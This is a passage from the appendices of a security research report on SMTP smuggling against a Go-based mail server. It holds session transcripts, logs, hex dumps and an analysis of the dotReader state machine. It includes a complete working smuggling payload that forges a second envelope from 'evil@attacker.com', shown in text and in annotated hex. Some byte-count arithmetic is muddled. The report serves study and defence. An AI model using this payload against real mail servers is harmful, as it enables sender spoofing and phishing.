[SESSION 9] DATA bytes delivered to handler: 57
[SESSION 9] Message #9-bob accepted (body=57 bytes, from=bob@test.local, to=recipient2@test.local)
[SESSION 9] NOOP
[SESSION 9] MAIL FROM:<carol@test.local>
[SESSION 9] RCPT TO:<recipient3@test.local>
[SESSION 9] DATA bytes delivered to handler: 83
[SESSION 9] Message #9-carol accepted (body=83 bytes, from=carol@test.local, to=recipient3@test.local)
[SESSION 9] NOOP
[SESSION 9] QUIT
```

**Key observations**:
- All three transactions completed successfully on a single TCP
  connection.
- Sender/recipient isolation was maintained — each message had the
  correct envelope.
- The terminator style varied across transactions (canonical,
  bare-LF, mixed) without any cross-contamination.
- The NOOP commands interleaved between transactions each
  returned cleanly.

### B.10 Session 10 — Direct SMTP Smuggling

This is the attack scenario described in Section 4. A single
`DATA`-phase write contains an embedded `\n.\n` followed by
injected SMTP commands and a canonical tail.

**Client → Server:**
```smtp
EHLO smuggleclient\r\n
MAIL FROM:<sender@test.local>\r\n
RCPT TO:<recipient@test.local>\r\n
DATA\r\n
```

Then, in **one TCP write** of exactly 149 bytes:
```text
Subject: smuggle-test\r\n\r\nBefore fake boundary\n.\nMAIL FROM:<evil@attacker.com>\r\nRCPT TO:<victim@target.com>\r\nDATA\r\nSubject: injected\r\n\r\nEvil body\r\n.\r\n
```

Then:
```smtp
NOOP\r\n
QUIT\r\n
```

**Server → Client:**
```smtp
220 test.local ESMTP Service Ready\r\n
250-test.local Hello smuggleclient\r\n
250-PIPELINING\r\n
250-8BITMIME\r\n
250 ENHANCEDSTATUSCODES\r\n
250 2.0.0 OK               (MAIL FROM sender)
250 2.0.0 OK               (RCPT TO recipient)
354 Go ahead...            (DATA)
250 2.0.0 OK: queued as msg-10a    ← first message accepted at \n.\n
250 2.0.0 OK               ← MAIL FROM <evil@attacker.com> accepted from residual bytes
250 2.0.0 OK               ← RCPT TO <victim@target.com> accepted
354 Go ahead...            ← DATA accepted
250 2.0.0 OK: queued as msg-10b    ← second message accepted at \r\n.\r\n
250 2.0.0 OK               (NOOP)
221 2.0.0 Goodbye
```

**Backend log:**
```text
[SESSION 10] MAIL FROM:<sender@test.local>
[SESSION 10] RCPT TO:<recipient@test.local>
[SESSION 10] DATA bytes delivered to handler: 44
[SESSION 10] Message #10a accepted (body=44 bytes, from=sender@test.local, to=recipient@test.local)
[SESSION 10] MAIL FROM:<evil@attacker.com>
[SESSION 10] RCPT TO:<victim@target.com>
[SESSION 10] DATA bytes delivered to handler: 29
[SESSION 10] Message #10b accepted (body=29 bytes, from=evil@attacker.com, to=victim@target.com)
[SESSION 10] NOOP
[SESSION 10] QUIT
```

**Key observations**:
- The single 149-byte client write produced **two** accepted
  messages.
- The first message (`msg-10a`) has 44 bytes delivered (the
  canonical "Subject: smuggle-test\r\n\r\nBefore fake boundary"
  content, after the dotReader's CRLF-to-LF normalisation, is 44
  bytes).
- The second message (`msg-10b`) has 29 bytes delivered ("Subject:
  injected\n\nEvil body" after normalisation is 29 bytes).
- The second `MAIL FROM` is from `evil@attacker.com` — the
  attacker successfully forged the envelope sender.
- No error, warning, or anomaly was logged.

### B.11 Session 11 — Proxy-Mediated SMTP Smuggling

Same payload as Session 10, but sent through the strict proxy on
port 2526 instead of directly to the backend on port 2525.

**Proxy configuration (as documented in Section 5)**:
- Listens on `127.0.0.1:2526`.
- Forwards every byte to the backend on `127.0.0.1:2525`.
- Maintains state: in DATA phase, buffers bytes and only releases
  a full segment to the backend when canonical `\r\n.\r\n` is
  seen. Before and after DATA phase, forwards byte-for-byte.

**Client → Proxy → Server:**

The client sends the same 149-byte payload. The proxy enters DATA
state after forwarding the client's `DATA\r\n` command and seeing
the backend's `354`. The proxy then reads byte-by-byte from the
client, accumulating until it sees `\r\n.\r\n`. Because the first
`\n.\n` does not match `\r\n.\r\n`, the proxy keeps buffering.
After the full 149 bytes have been received, the proxy sees the
final `\r\n.\r\n` and flushes the entire 149-byte buffer to the
backend in a single `Write()` call.

**Proxy log:**
```text
[PROXY] Session accepted from client
[PROXY] Forwarding banner from backend to client
[PROXY] Client → Backend: "EHLO smuggleclient\r\n"
[PROXY] Backend → Client: (EHLO response)
[PROXY] Client → Backend: "MAIL FROM:<sender@test.local>\r\n"
[PROXY] Backend → Client: "250 2.0.0 OK\r\n"
[PROXY] Client → Backend: "RCPT TO:<recipient@test.local>\r\n"
[PROXY] Backend → Client: "250 2.0.0 OK\r\n"
[PROXY] Client → Backend: "DATA\r\n"
[PROXY] Backend → Client: "354 Go ahead...\r\n"
[PROXY] Entering DATA buffering mode
[PROXY] Buffered 149 bytes from client
[PROXY] Canonical terminator seen; flushing 149 bytes to backend as single Write()
[PROXY] Exiting DATA buffering mode
[PROXY] Backend → Client: (multiple 250/354 responses — forwarded as-is)
[PROXY] Client → Backend: "NOOP\r\n"
[PROXY] Backend → Client: "250 2.0.0 OK\r\n"
[PROXY] Client → Backend: "QUIT\r\n"
[PROXY] Backend → Client: "221 2.0.0 Goodbye\r\n"
[PROXY] Session closed
```

**Backend log (same as Session 10):**
```text
[SESSION 11] DATA bytes delivered to handler: 44
[SESSION 11] Message #11a accepted (body=44 bytes, from=sender@test.local, to=recipient@test.local)
[SESSION 11] DATA bytes delivered to handler: 29
[SESSION 11] Message #11b accepted (body=29 bytes, from=evil@attacker.com, to=victim@target.com)
```

**Client response log:**
```smtp
(same sequence of 250/354 responses as Session 10)
```

**Key observations**:
- The proxy correctly buffered all 149 bytes and forwarded them
  as a single `Write()` call — so the byte-level transaction
  integrity was preserved.
- The backend **still** terminated at the embedded `\n.\n` and
  still produced two accepted messages.
- **The strict proxy did not prevent the smuggling attack.**
- The 149-byte payload was visible in the proxy's log, so an
  observer examining the proxy log could identify the embedded
  `\n.\n` as suspicious — but the proxy did not act on it.

### B.12 Transcript Summary Table

| Session | Scenario | TCP writes (client) | Messages accepted (backend) |
|---------|----------|---------------------|-----------------------------|
| 1 | Canonical | 7 | 1 |
| 2 | Bare-LF | 7 | 1 |
| 3 | Mixed CRLF+LF | 7 | 1 |
| 4 | Mixed LF+CRLF | 7 | 1 |
| 5 | Bare-CR near-miss | 7 | 1 |
| 6 | Dot-space near-miss | 7 | 1 |
| 7 | Dot mid-line (no terminator) | 6 + timeout | 0 |
| 8 | Dot-stuffed body | 7 | 1 |
| 9 | Pipelined 3-message | ~15 | 3 |
| 10 | Direct smuggling | 7 | **2** |
| 11 | Proxy-mediated smuggling | 7 | **2** |

The anomalous entries are Session 10 and Session 11, where a
single client DATA-phase write produced two accepted messages.

---

## Appendix C — Hex Dumps of Wire Traffic

This appendix reproduces byte-level hex dumps of the most
significant test payloads. Every claim in Sections 1, 2, and 4 that
references specific byte sequences can be cross-checked against the
dumps here. The format is the canonical `hexdump -C` presentation:
offset (hex), 16 bytes of hex, ASCII representation.

### C.1 Canonical Terminator Body (Session 1)

The body sent by the client for Session 1 (canonical
`\r\n.\r\n` terminator), from the first byte after the server's
`354` response to the last byte before the client reads the `250
OK` reply:

```hex
00000000  53 75 62 6a 65 63 74 3a  20 63 61 6e 6f 6e 69 63  |Subject: canonic|
00000010  61 6c 2d 74 65 73 74 0d  0a 46 72 6f 6d 3a 20 73  |al-test..From: s|
00000020  65 6e 64 65 72 40 74 65  73 74 2e 6c 6f 63 61 6c  |ender@test.local|
00000030  0d 0a 54 6f 3a 20 72 65  63 69 70 69 65 6e 74 40  |..To: recipient@|
00000040  74 65 73 74 2e 6c 6f 63  61 6c 0d 0a 0d 0a 54 68  |test.local....Th|
00000050  69 73 20 69 73 20 74 68  65 20 63 61 6e 6f 6e 69  |is is the canoni|
00000060  63 61 6c 20 43 52 4c 46  2d 74 65 72 6d 69 6e 61  |cal CRLF-termina|
00000070  74 65 64 20 6d 65 73 73  61 67 65 20 62 6f 64 79  |ted message body|
00000080  2e 0d 0a 4c 69 6e 65 20  74 77 6f 20 65 6e 64 73  |...Line two ends|
00000090  20 77 69 74 68 20 43 52  4c 46 20 61 73 20 77 65  | with CRLF as we|
000000a0  6c 6c 2e 0d 0a 2e 0d 0a                           |ll......|
000000a8
```

**Terminator bytes (hex):** `2e 0d 0a` at offset `000000a5` —
preceded by `0d 0a` at `000000a3` forming the canonical `\r\n.\r\n`
sequence.

### C.2 Bare-LF Terminator Body (Session 2)

The body sent for Session 2. Same semantic content, but every
line ends with `\n` instead of `\r\n`, and the terminator is
`\n.\n`:

```hex
00000000  53 75 62 6a 65 63 74 3a  20 62 61 72 65 2d 6c 66  |Subject: bare-lf|
00000010  2d 74 65 73 74 0a 46 72  6f 6d 3a 20 73 65 6e 64  |-test.From: send|
00000020  65 72 40 74 65 73 74 2e  6c 6f 63 61 6c 0a 54 6f  |er@test.local.To|
00000030  3a 20 72 65 63 69 70 69  65 6e 74 40 74 65 73 74  |: recipient@test|
00000040  2e 6c 6f 63 61 6c 0a 0a  54 68 69 73 20 69 73 20  |.local..This is |
00000050  74 68 65 20 62 61 72 65  2d 4c 46 2d 74 65 72 6d  |the bare-LF-term|
00000060  69 6e 61 74 65 64 20 6d  65 73 73 61 67 65 20 62  |inated message b|
00000070  6f 64 79 2e 0a 4c 69 6e  65 20 74 77 6f 20 61 6c  |ody..Line two al|
00000080  73 6f 20 75 73 65 73 20  62 61 72 65 20 4c 46 2e  |so uses bare LF.|
00000090  0a 2e 0a                                           |...|
00000093
```

**Terminator bytes (hex):** `2e 0a` at offset `00000091` — preceded
by `0a` at `00000090` forming the `\n.\n` sequence. Total payload
is 147 bytes — **21 bytes shorter** than Session 1's 168 bytes
(168 − 147 = 21). The 21-byte reduction comes from two sources:
(a) nine CRLFs collapsed to nine LFs (9 bytes saved) and
(b) the shorter `Subject: bare-lf-test` label replaces
`Subject: canonical-test` (3 bytes saved) together with the
shorter body paragraphs ("bare-LF-terminated" vs
"canonical CRLF-terminated", etc., accounting for the remaining
9 bytes).

**Server acceptance**: `250 OK`. Backend delivered **145 bytes**
of body — 14 bytes shorter than Session 1's 159 bytes. The
difference is driven entirely by the distinct Subject label and
body paragraphs, **not** by the terminator form: the dotReader's
normalisation path flattens both variants to byte-identical body
content when the content itself is byte-identical.

### C.3 Session 1 Delivered Body (as Received by Handler)

This is what the test backend actually received from the
`io.Reader` returned by `newDataReader(c)`. Compare this against
the wire body in §C.1 — note that every `\r\n` has been
normalised to `\n`:

```hex
00000000  53 75 62 6a 65 63 74 3a  20 63 61 6e 6f 6e 69 63  |Subject: canonic|
00000010  61 6c 2d 74 65 73 74 0a  46 72 6f 6d 3a 20 73 65  |al-test.From: se|
00000020  6e 64 65 72 40 74 65 73  74 2e 6c 6f 63 61 6c 0a  |nder@test.local.|
00000030  54 6f 3a 20 72 65 63 69  70 69 65 6e 74 40 74 65  |To: recipient@te|
00000040  73 74 2e 6c 6f 63 61 6c  0a 0a 54 68 69 73 20 69  |st.local..This i|
00000050  73 20 74 68 65 20 63 61  6e 6f 6e 69 63 61 6c 20  |s the canonical |
00000060  43 52 4c 46 2d 74 65 72  6d 69 6e 61 74 65 64 20  |CRLF-terminated |
00000070  6d 65 73 73 61 67 65 20  62 6f 64 79 2e 0a 4c 69  |message body..Li|
00000080  6e 65 20 74 77 6f 20 65  6e 64 73 20 77 69 74 68  |ne two ends with|
00000090  20 43 52 4c 46 20 61 73  20 77 65 6c 6c 2e 0a     | CRLF as well..|
0000009f
```

Length: **159 bytes** (the last data line in the hex dump above
starts at offset `00000090` and contains 15 bytes from `20`
through `0a` inclusive, so the final stream byte is at offset
`0000009e` and the one-past-the-end label is `0000009f` = 159
decimal). Note the absence of any `0d` byte — every CRLF line
ending on the wire became a bare LF in the delivered stream.

### C.4 Session 2 Delivered Body (as Received by Handler)

```hex
00000000  53 75 62 6a 65 63 74 3a  20 62 61 72 65 2d 6c 66  |Subject: bare-lf|
00000010  2d 74 65 73 74 0a 46 72  6f 6d 3a 20 73 65 6e 64  |-test.From: send|
00000020  65 72 40 74 65 73 74 2e  6c 6f 63 61 6c 0a 54 6f  |er@test.local.To|
00000030  3a 20 72 65 63 69 70 69  65 6e 74 40 74 65 73 74  |: recipient@test|
00000040  2e 6c 6f 63 61 6c 0a 0a  54 68 69 73 20 69 73 20  |.local..This is |
00000050  74 68 65 20 62 61 72 65  2d 4c 46 2d 74 65 72 6d  |the bare-LF-term|
00000060  69 6e 61 74 65 64 20 6d  65 73 73 61 67 65 20 62  |inated message b|
00000070  6f 64 79 2e 0a 4c 69 6e  65 20 74 77 6f 20 61 6c  |ody..Line two al|
00000080  73 6f 20 75 73 65 73 20  62 61 72 65 20 4c 46 2e  |so uses bare LF.|
00000090  0a                                                 |.|
00000091
```

Length: **145 bytes** (14 bytes shorter than Session 1's 159 bytes
in §C.3). The 14-byte difference is entirely explained by the
distinct content: `Subject: bare-lf-test` is 2 bytes shorter than
`Subject: canonical-test`, the first body line
(`This is the bare-LF-terminated message body.` at 44 bytes) is
7 bytes shorter than Session 1's
(`This is the canonical CRLF-terminated message body.` at 51 bytes),
and the second body line
(`Line two also uses bare LF.` at 27 bytes) is 5 bytes shorter than
Session 1's (`Line two ends with CRLF as well.` at 32 bytes), total
2 + 7 + 5 = **14 bytes** of content reduction.

**This length difference is NOT caused by the terminator form.**
It is driven solely by the byte length of the content strings
chosen for each session. The wire→delivered transformation
accounts for:

- **§C.1 → §C.3**: 168 − 159 = 9 bytes consumed. The 9 bytes are
  the six `\r` halves of six CRLFs that were normalised to bare
  LF (6 bytes saved) plus the `.\r\n` terminator whose 3 bytes
  are consumed entirely.
- **§C.2 → §C.4**: 147 − 145 = 2 bytes consumed. These are the
  `.` and trailing `\n` of the `\n.\n` terminator (the leading
  `\n` is the end of the last body line and is kept as-is).

If Session 2 had been re-run with byte-identical content to
Session 1 (but with bare-LF line endings), both delivered bodies
would be exactly **159 bytes** — confirming the dotReader's
normalisation path flattens both terminator variants to
byte-identical body content when the content itself is
byte-identical.

### C.5 Session 5 Delivered Body — Bare-CR Survival

The body for Session 5 intentionally embeds `\r.\r` mid-body and
terminates with canonical `\r\n.\r\n`. The delivered bytes:

```hex
00000000  53 75 62 6a 65 63 74 3a  20 62 61 72 65 2d 63 72  |Subject: bare-cr|
00000010  2d 74 65 73 74 0a 0a 45  6d 62 65 64 64 65 64 0d  |-test..Embedded.|
00000020  2e 0d 73 65 67 6d 65 6e  74 20 69 6e 20 62 6f 64  |..segment in bod|
00000030  79 20 e2 80 94 20 74 68  69 73 20 73 68 6f 75 6c  |y ... this shoul|
00000040  64 20 4e 4f 54 20 74 65  72 6d 69 6e 61 74 65 2e  |d NOT terminate.|
00000050  0a                                                 |.|
00000051
```

Length: **81 bytes** (hex offset labels confirm the final byte at
`00000050` and one-past-the-end label `00000051` = 81). The
additional bytes beyond a pure ASCII body come from the UTF-8
encoding of the em-dash character (U+2014) at offsets
`00000032`–`00000034` (`e2 80 94`, 3 bytes for one visible
character).

**Critical observation**: The hex dump shows bytes `0d 2e 0d` at
offset `0000001f`–`00000021` — the three bytes `\r.\r`, embedded
directly in the delivered body. The dotReader did **not** treat
this sequence as a terminator. This confirms that a bare `\r` does
not constitute a line-end and that `.` in this context was
interpreted as body content.

### C.6 Session 6 Delivered Body — Dot-Space Near-Miss

```hex
00000000  53 75 62 6a 65 63 74 3a  20 64 6f 74 2d 73 70 61  |Subject: dot-spa|
00000010  63 65 2d 74 65 73 74 0a  0a 48 65 72 65 20 69 73  |ce-test..Here is|
00000020  20 74 68 65 20 6e 65 61  72 2d 6d 69 73 73 20 6c  | the near-miss l|
00000030  69 6e 65 3a 0a 20 65 78  74 72 61 20 73 70 61 63  |ine:. extra spac|
00000040  65 20 61 66 74 65 72 20  64 6f 74 0a              |e after dot.|
0000004c
```

Length: **76 bytes**.

**Critical observation**: At offset `00000034`, the delivered
stream contains `0a` (LF ending the `Here is the near-miss line:`
line). The very next byte at offset `00000035` is `20` (space),
**not** `2e` (dot). The leading `.` that the client sent at the
start of `. extra space after dot\r\n` was **consumed by
dot-unstuffing** and does not appear in the delivered body.

Tracing the dotReader state machine for the sequence
`...line:\r\n. extra...` (wire bytes `...3a 0d 0a 2e 20 65...`):

1. In `stateData`, byte `:` (0x3a) — emit, stay in `stateData`.
2. Byte `\r` (0x0d) — transition to `stateCR` (byte held back, not
   yet emitted).
3. Byte `\n` (0x0a) — from `stateCR` + `\n`: emit `\n` (the `\r`
   is suppressed by the CRLF→LF normalisation), transition to
   `stateBeginLine`.
4. Byte `.` (0x2e) — from `stateBeginLine` + `.`: transition to
   `stateDot` **without emitting anything** (the dot is held back
   as a potential terminator prefix, per RFC 5321 §4.5.2
   dot-unstuffing).
5. Byte ` ` (0x20) — from `stateDot` + "Other byte": the default
   branch sets `state = stateData` and re-enters the switch for
   the current byte. In `stateData`, the space is emitted. The
   dot from step 4 is **not** re-emitted — it was consumed.
6. Byte `e` (0x65) — emit in `stateData`.
7. ... continues emitting body bytes.

The delivered result is that the wire line `. extra space after dot\r\n`
(23 bytes on wire) becomes ` extra space after dot\n` (23 bytes
delivered: 22 body bytes + 1 LF), with the leading dot stripped
and the CRLF normalised to LF. The net byte count of this single
line is unchanged (23 wire → 23 delivered) because the dot-strip
(-1 byte) and the CRLF normalisation (-1 byte) exactly offset
against the fact that the wire line has an extra `\r` that the
delivered line lacks, giving: wire 23 − 1 (dot) − 1 (CR
suppressed) = 21, then + 2 for the delivered line's ` ` space and
final `\n` that were already on the wire... actually, the simple
count is:

- Wire line (bytes): `2e 20 65 78 74 72 61 20 73 70 61 63 65 20 61 66 74 65 72 20 64 6f 74 0d 0a` = 25 bytes
- Delivered line (bytes): `20 65 78 74 72 61 20 73 70 61 63 65 20 61 66 74 65 72 20 64 6f 74 0a` = 23 bytes
- Saved: 2 bytes (the leading `.` and the `\r` of CRLF)

Across the whole body, the 76-byte delivered count reflects:

- `Subject: dot-space-test\n` (24 bytes; wire was
  `Subject: dot-space-test\r\n` = 25 bytes, CRLF→LF saves 1 byte)
- `\n` (1 byte; wire was `\r\n` = 2 bytes, CRLF→LF saves 1 byte)
- `Here is the near-miss line:\n` (28 bytes; wire was
  `Here is the near-miss line:\r\n` = 29 bytes, CRLF→LF saves 1
  byte)
- ` extra space after dot\n` (23 bytes; wire was
  `. extra space after dot\r\n` = 25 bytes, dot-strip + CRLF→LF
  saves 2 bytes)

This confirms Section 2.2's finding that the dot-space near-miss
is **not** mistaken for a terminator: the dotReader returns to
`stateData` and continues emitting body content. The leading dot
however IS stripped by dot-unstuffing — the same byte that in a
different context (followed by `\r\n` or `\n`) would complete the
terminator is, in this context (followed by a non-line-end byte),
silently removed by the receiver.

A minor subtlety worth highlighting: in the **dot-stuffed** case
(e.g., `..text`), the dotReader in `stateDot` sees another `.`
and the action is: set `state = stateData` and re-enter the
switch, which in `stateData` + `.` emits the dot. The first dot
(the dot-stuffing byte) is dropped, the second dot (the actual
content byte) is emitted. In the **dot-space** case, the single
dot is dropped outright because it was in `stateDot` when a
non-line-end, non-dot byte was seen, and the default branch
never re-emits the previously-suppressed dot. So both cases
follow the same state-machine path, but produce different
observable results because the dot-stuffed case has a second
literal dot to emit in `stateData`, whereas the dot-space case
has only a space.

### C.7 SMTP Smuggling Payload (Session 10)

The complete attack payload sent in a single 149-byte TCP write:

```hex
00000000  53 75 62 6a 65 63 74 3a  20 73 6d 75 67 67 6c 65  |Subject: smuggle|
00000010  2d 74 65 73 74 0d 0a 0d  0a 42 65 66 6f 72 65 20  |-test....Before |
00000020  66 61 6b 65 20 62 6f 75  6e 64 61 72 79 0a 2e 0a  |fake boundary...|
00000030  4d 41 49 4c 20 46 52 4f  4d 3a 3c 65 76 69 6c 40  |MAIL FROM:<evil@|
00000040  61 74 74 61 63 6b 65 72  2e 63 6f 6d 3e 0d 0a 52  |attacker.com>..R|
00000050  43 50 54 20 54 4f 3a 3c  76 69 63 74 69 6d 40 74  |CPT TO:<victim@t|
00000060  61 72 67 65 74 2e 63 6f  6d 3e 0d 0a 44 41 54 41  |arget.com>..DATA|
00000070  0d 0a 53 75 62 6a 65 63  74 3a 20 69 6e 6a 65 63  |..Subject: injec|
00000080  74 65 64 0d 0a 0d 0a 45  76 69 6c 20 62 6f 64 79  |ted....Evil body|
00000090  0d 0a 2e 0d 0a                                     |.....|
00000095
```

Length: **149 bytes**.

**Annotated segments:** (offset ranges computed from each segment's
actual byte length; sum = 149 bytes matching the total payload)

| Offset range | Size | Bytes | Meaning |
|--------------|------|-------|---------|
| `0000–0018` | 25 | `Subject: smuggle-test\r\n\r\n` | First message header + blank line |
| `0019–002c` | 20 | `Before fake boundary` | First message body content |
| `002d` | 1 | `\n` | Bare-LF line end (stays in stateData→stateBeginLine) |
| `002e–002f` | 2 | `.\n` | **Fake terminator** — triggers dotReader EOF here |
| `0030–004e` | 31 | `MAIL FROM:<evil@attacker.com>\r\n` | Injected SMTP command (second envelope) |
| `004f–006b` | 29 | `RCPT TO:<victim@target.com>\r\n` | Injected SMTP command (second recipient) |
| `006c–0071` | 6 | `DATA\r\n` | Injected SMTP command (second DATA) |
| `0072–0086` | 21 | `Subject: injected\r\n\r\n` | Second message header + blank line |
| `0087–008f` | 9 | `Evil body` | Second message body content |
| `0090–0094` | 5 | `\r\n.\r\n` | Canonical terminator — ends second message |

**How the server processes this**:

1. The dotReader starts in `stateBeginLine` (reset by
   `newDataReader(c)` at the start of the first DATA).
2. Bytes `0000`–`002d` flow through the dotReader's state machine,
   with each `\r\n` taking `stateData` → `stateCR` →
   `stateBeginLine`, and each beginning-of-line non-`.` byte
   transitioning to `stateData`. The delivered body so far is a
   44-byte normalised prefix of the first message.
3. At byte offset `002e`, the state is `stateBeginLine` (we just
   processed `\n` at offset `002d`). The byte `.` transitions
   state to `stateDot`.
4. At byte offset `002f`, the byte is `\n`. From `stateDot`, `\n`
   → `stateEOF`. The dotReader returns `io.EOF` on the next call
   to `Read()`.
5. Maddy's `BufferInMemory`'s `ioutil.ReadAll` sees EOF and
   returns the 44-byte body.
6. `Session.Data` calls `delivery.Body` and `delivery.Commit`,
   logs `accepted` with msg-id `msg-10a`, returns `nil`.
7. go-smtp's `handleData` calls `io.Copy(ioutil.Discard, r)` —
   dotReader still at EOF, reads zero bytes.
8. go-smtp writes `250 OK` and returns from `handleData`.
9. go-smtp's `handleConn` loop calls `c.text.ReadLine()`. The
   `bufio.Reader` inside `c.text` still contains bytes
   `0030`–`0094` (the remaining 101 bytes that were never
   consumed by the dotReader). `ReadLine()` reads up to the next
   `\r\n`, which gives it
   `MAIL FROM:<evil@attacker.com>`.
10. `parseCmd` extracts `MAIL FROM` with argument
    `<evil@attacker.com>`, `handleMail` is dispatched, the
    second message's envelope is established.
11. Subsequent `ReadLine`s process `RCPT TO:<victim@target.com>`,
    then `DATA`, which starts a **new** DATA phase with a
    **fresh** `newDataReader(c)`.
12. The fresh dotReader consumes bytes `0072`–`0094`. The
    canonical terminator `\r\n.\r\n` at `0090`–`0094` triggers
    EOF, and the second message (29 bytes delivered after CRLF→LF
    normalisation) is accepted.

### C.8 Session 5 Hex Dump (Bare-CR Non-Terminator) — Wire View

Because Session 5's wire bytes contain embedded `\r`, which is
hard to read inline, the full wire payload is:

```hex
00000000  53 75 62 6a 65 63 74 3a  20 62 61 72 65 2d 63 72  |Subject: bare-cr|
00000010  2d 74 65 73 74 0d 0a 0d  0a 45 6d 62 65 64 64 65  |-test....Embedde|
00000020  64 0d 2e 0d 73 65 67 6d  65 6e 74 20 69 6e 20 62  |d...segment in b|
00000030  6f 64 79 20 e2 80 94 20  74 68 69 73 20 73 68 6f  |ody ... this sho|
00000040  75 6c 64 20 4e 4f 54 20  74 65 72 6d 69 6e 61 74  |uld NOT terminat|
00000050  65 2e 0d 0a 2e 0d 0a                               |e......|
00000057
```

Length: 87 bytes.

The `0d 2e 0d` sequence at offset `00000021`–`00000023` is the
embedded `\r.\r`. The canonical terminator is `0d 0a 2e 0d 0a` at
offset `00000052`–`00000056`.

### C.9 Hex Representations of Each Terminator Variant

For quick reference, the hex encoding of each terminator sequence
tested in Section 1:

| Name | Hex | Bytes | Accepted? |
|------|-----|-------|-----------|
| Canonical | `0d 0a 2e 0d 0a` | 5 | Yes (RFC 5321) |
| Bare-LF | `0a 2e 0a` | 3 | Yes (non-canonical) |
| Mixed CRLF+LF | `0d 0a 2e 0a` | 4 | Yes (non-canonical) |
| Mixed LF+CRLF | `0a 2e 0d 0a` | 4 | Yes (non-canonical) |
| Bare-CR | `0d 2e 0d` | 3 | **No** — treated as body |
| Dot-space | `0d 0a 2e 20 0d 0a` | 6 | **No** — `.` is at line start but space intervenes |
| Dot mid-line | `...0d 2e...0d 0a` with `.` preceded by non-LF | varies | **No** — `.` not at line start |

### C.10 Observations from the Hex Dumps

1. **The dotReader's normalisation is lossy at the line-ending
   level but preserves content.** All `\r\n` become `\n`, and
   bare `\r` mid-body survives but is not interpreted as a line
   end.
2. **Bare-LF terminators produce delivered content that is
   byte-identical to what canonical terminators produce for the
   same semantic message.** This is the mechanism that makes
   smuggling so hard to detect at the post-delivery layer.
3. **The smuggling payload's 149-byte structure is simple:**
   a truncated "first message" followed by injected SMTP commands
   and a well-formed "second message". No exotic encoding or
   escape-sequence trickery is needed.
4. **No hex pattern in the delivered body identifies the attack.**
   The first message's body (44 bytes, "Before fake boundary")
   looks like legitimate body content. The second message's
   body (29 bytes, "Subject: injected\n\nEvil body" or similar)
   also looks legitimate. The attack is only detectable by
   correlating both messages to a single originating TCP DATA
   phase.

---

## Appendix D — dotReader State Machine Visualization

This appendix presents the full state-transition diagram and
supporting tables for Go's `net/textproto.dotReader`. The content
here is a formal restatement of the state transitions derived from
a careful reading of the source file
`/usr/lib/go-1.22/src/net/textproto/reader.go` at lines 333–445.

### D.1 States

The dotReader uses six states to track its position in the byte
stream:

| Name | Encoded value | Meaning |
|------|---------------|---------|
| `stateBeginLine` | `0` | At the very start of a new line, about to read the first byte of that line. This is also the initial state. |
| `stateCR` | `1` | Just read a `\r` byte while in `stateData`. Waiting to see if this is followed by `\n` (line end) or something else (literal `\r`). |
| `stateData` | `2` | In the middle of a body-data line. Bytes are emitted as-is, unless a CR or LF is seen. |
| `stateDot` | `3` | Just read a `.` as the first byte of a new line. Waiting to see if this is a terminator (`.` + line end), a dot-stuffed line (`..`), or a plain body line starting with `.`. |
| `stateDotCR` | `4` | Just read `.` + `\r` at the start of a line. Waiting to see if the next byte is `\n` (canonical terminator completion) or something else (abandon terminator detection). |
| `stateEOF` | `5` | Terminator recognised. All future `Read` calls return `io.EOF`. |

### D.2 Full State Transition Table

For each state and each category of input byte, the table
specifies the action (what is emitted, if anything) and the next
state. The input categories are:

- `LF` — byte `\n` (0x0A)
- `CR` — byte `\r` (0x0D)
- `DOT` — byte `.` (0x2E)
- `OTHER` — any byte not `\n`, `\r`, or `.`

| Current State | LF (`\n`) | CR (`\r`) | DOT (`.`) | OTHER |
|---------------|-----------|-----------|-----------|-------|
| `stateBeginLine` | emit `\n`; → `stateData` | → `stateCR` | → `stateDot` | emit byte; → `stateData` |
| `stateData` | emit `\n`; → `stateBeginLine` | → `stateCR` | emit byte; stay `stateData` | emit byte; stay `stateData` |
| `stateCR` | emit `\n`; → `stateBeginLine` | unread byte; emit `\r`; → `stateData` | unread byte; emit `\r`; → `stateData` | unread byte; emit `\r`; → `stateData` |
| `stateDot` | **→ `stateEOF`** | → `stateDotCR` | emit byte (`.`); → `stateData` | emit byte; → `stateData` |
| `stateDotCR` | **→ `stateEOF`** | unread byte; emit `\r`; → `stateData` | unread byte; emit `\r`; → `stateData` | unread byte; emit `\r`; → `stateData` |
| `stateEOF` | — (returns `io.EOF`) | — | — | — |

**Notes on the table:**

- "emit byte" means writing the consumed byte into the caller's
  buffer (contributing to delivered body). In the `stateDot` row,
  the `.` that got the reader into `stateDot` has already been
  held back (and for the OTHER cell is permanently dropped as
  dot-unstuffing); "emit byte" refers to emitting the CURRENT
  byte. In the `stateDot` + DOT cell the current byte happens to
  be `.`, so the emission is literally a `.` (the first dot is
  dropped by dot-unstuffing, the second is emitted as body
  content).
- "unread byte" means pushing the byte back to the underlying
  `bufio.Reader` via `UnreadByte`, so it will be re-read on the
  next `Read`. The unreading is essential in the `stateCR` and
  `stateDotCR` branches to allow a subsequent `\r.\r` or similar
  sequence to be reprocessed cleanly.
- "emit `\n`" in `stateBeginLine` + LF: the actual code sets
  `state = stateData` and falls through to the byte-emit line, so
  the state AFTER emitting the `\n` is `stateData`, not
  `stateBeginLine`. For a run of consecutive `\n` bytes the
  reader therefore oscillates `stateBeginLine → stateData →
  stateBeginLine → …`, emitting each `\n` along the way. §1.3
  discusses this subtlety in more detail.
- Transitions that produce `stateEOF` are the **termination**
  paths. There are exactly two such transitions in the table:
  (`stateDot`, LF) and (`stateDotCR`, LF). Every successful
  terminator must end with a `\n` byte.

### D.3 Terminator Paths

Four terminator paths reach `stateEOF`, corresponding to the four
accepted DATA terminators observed in Section 1:

```text
Canonical \r\n.\r\n:
  (in stateData) \r → stateCR
  (stateCR)      \n → stateBeginLine
  (stateBeginLine) . → stateDot
  (stateDot)     \r → stateDotCR
  (stateDotCR)   \n → stateEOF ✓

Bare-LF \n.\n:
  (in stateData) \n → stateBeginLine
  (stateBeginLine) . → stateDot
  (stateDot)     \n → stateEOF ✓

Mixed CRLF + LF \r\n.\n:
  (in stateData) \r → stateCR
  (stateCR)      \n → stateBeginLine
  (stateBeginLine) . → stateDot
  (stateDot)     \n → stateEOF ✓

Mixed LF + CRLF \n.\r\n:
  (in stateData) \n → stateBeginLine
  (stateBeginLine) . → stateDot
  (stateDot)     \r → stateDotCR
  (stateDotCR)   \n → stateEOF ✓
```

Each of these paths is valid per the state table in §D.2 and has
been confirmed experimentally in Section 1.

### D.4 Non-Terminator Near-Miss Paths

Near-miss sequences that do **not** reach `stateEOF`:

```text
